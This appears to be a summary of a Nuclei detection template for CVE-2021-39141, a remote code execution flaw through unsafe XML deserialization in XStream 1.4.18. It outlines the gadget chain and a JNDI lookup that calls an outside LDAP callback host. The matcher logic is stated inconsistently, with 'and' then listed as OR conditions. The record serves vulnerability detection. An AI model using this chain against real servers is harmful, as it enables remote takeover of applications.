---
cve_id: CVE-2021-39141
template_path: nuclei-templates/http/cves/2021/CVE-2021-39141.yaml
affected_product: XStream
severity: high
authentication: none
external_callback: true
affected_versions: 1.4.18
preconditions: Application deserializes untrusted XML data using XStream
poc_classification: rce
---

## Vulnerability
XStream 1.4.18 is susceptible to remote code execution. An attacker can execute commands on the host by manipulating the processed input stream, thereby making it possible to obtain sensitive information, modify data, and/or execute unauthorized administrative operations in the context of the affected site.

Attackers can exploit unsafe deserialization in XStream to execute arbitrary commands on the host, potentially obtaining sensitive information and compromising the entire application server.

CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:H/A:H (8.5). CWE-434.

## PoC / Detection
Classification: rce

The template sends a single raw POST request to `/` (Content-Type: application/xml) containing a complex gadget-chain XML payload: a `java.util.PriorityQueue` (size 2) wrapping a dynamic proxy implementing `java.lang.Comparable`, backed by `com.sun.xml.internal.ws.client.sei.SEIStub` with `SEIStubHandler`, `JAXBWrapperAccessor`, chained `FieldSetter`/`FieldGetter` references, and ultimately triggering `javax.naming.InitialContext.doLookup("ldap://{{interactsh-url}}/#evil")` on deserialization. Matchers-condition is `and`; detection succeeds on OOB DNS interaction (`interactsh_protocol` contains "dns") OR XStream strings ("timestamp", "com.thoughtworks.xstream") in body OR `application/json` header OR HTTP 500 status.

## References
- http://x-stream.github.io/CVE-2021-39141.html
- https://x-stream.github.io/CVE-2021-39141.html
- https://github.com/x-stream/xstream/security/advisories/GHSA-g5w6-mrj7-75h2
- https://security.netapp.com/advisory/ntap-20210923-0003/
- https://nvd.nist.gov/vuln/detail/CVE-2021-39141
